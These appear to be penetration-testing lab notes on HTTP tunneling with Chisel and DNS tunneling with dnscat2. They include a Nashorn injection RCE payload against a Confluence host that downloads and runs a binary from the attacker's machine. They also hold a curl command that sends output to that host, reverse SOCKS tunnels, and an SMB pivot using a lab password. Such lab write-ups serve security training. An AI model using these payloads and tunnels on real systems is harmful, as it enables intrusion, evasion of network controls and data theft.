HTTP Tunneling Theory and Practice
==================================

HTTP Tunneling Fundamentals
---------------------------

### Scenario

- CONFLUENCE01 is compromised again, can execute commands via HTTP requests.
- DPI solution is terminating all outbound traffic **except HTTP**.
- Inbound ports are blocked except TCP/8090.
- No reverse shell works (not HTTP), no SSH for the same reason.

### HTTP Tunneling with Chisel

Chisel is a HTTP tunneling tool that encapsulates data streams within HTTP. It also uses SSH, so the HTTP wrapper is safe.

Chisel uses a client/server model — server must be set up.

Reverse port forwarding is particularly useful (like `ssh -R`).

**Plan**: Run Chisel server on Kali, connect via Chisel client from CONFLUENCE01.

Chisel binds a SOCKS proxy port on Kali, encapsulates all packets through SOCKS, pushes through the HTTP tunnel.

### Chisel Setup

#### 1. Copy chisel binary on Kali:

```bash
sudo cp $(which chisel) .
```

#### 2. Download chisel binary on target:

```bash
wget <myip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

#### 3. Construct Nashorn-based curl command for RCE on CONFLUENCE01:

```bash
curl http://<targetip>:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','wget <myip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel').start()")}/
```

#### 4. Start Chisel server on Kali:

```bash
chisel server --port 8080 --reverse
```

#### 5. Execute client on CONFLUENCE01:

```bash
/tmp/chisel client <kali-ip>:8080 R:socks > /dev/null 2>&1 &
```

#### 6. Alternative (log errors to file and exfil via curl):

```bash
/tmp/chisel client <myip>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://<myip>:8080/
```

Corresponding encoded curl RCE payload:

```bash
curl http://<targetip>:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','/tmp/chisel client <myip>:8080 R:socks &> /tmp/output ; curl --data @/tmp/output http://<myip>:8080/').start()")}/
```

### Compatibility Notes

- If version mismatch or glibc error occurs:
  ```bash
  wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
  gunzip chisel_1.8.1_linux_amd64.gz
  ```

- Serve the correct version from Kali.

- Use `ss -ntplu` to check listening connections.

### SOCKS Proxy with SSH via ProxyCommand

- Use `ncat` (not netcat) to support proxying:

```bash
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@<targetip>
```

- Proxychains config must be updated to use port 1080.

---

DNS Tunneling Theory and Practice
=================================

DNS Tunneling Fundamentals
--------------------------

- DNS resolves human-readable domains to IPv4/IPv6 via recursive resolution.
- A records contain IPv4 address mappings.
- Recursive resolver queries root → TLD → authoritative name servers.

### Lab Setup

- MULTISERVER03 is DNS.
- FELINEAUTHORITY is authoritative for `feline.corp`.

#### On FELINEAUTHORITY

```bash
cd dns_tunneling
cat dnsmasq.conf
sudo dnsmasq -C dnsmasq.conf -d  # run in foreground
sudo tcpdump -i ens192 udp port 53
```

#### On PGDATABASE01

Check DNS config:

```bash
resolvectl status
nslookup exfiltrated-data.feline.corp
```

If `.feline.corp` queries escape, exfiltration confirmed.

Use TXT records for infiltration:

```bash
sudo dnsmasq -C dnsmasq_txt.conf -d
nslookup -type=txt www.feline.corp
```

### DNS Tunneling with dnscat2

#### On FELINEAUTHORITY

```bash
sudo tcpdump -i ens192 udp port 53
dnscat2-server feline.corp
```

#### On PGDATABASE01

```bash
cd dnscat/
./dnscat feline.corp
```

#### Inside dnscat2

```bash
windows
window -i 1
help
```

To pivot to internal SMB share:

```bash
listen 127.0.0.1:4455 172.16.2.11:445
```

Then on FA:

```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```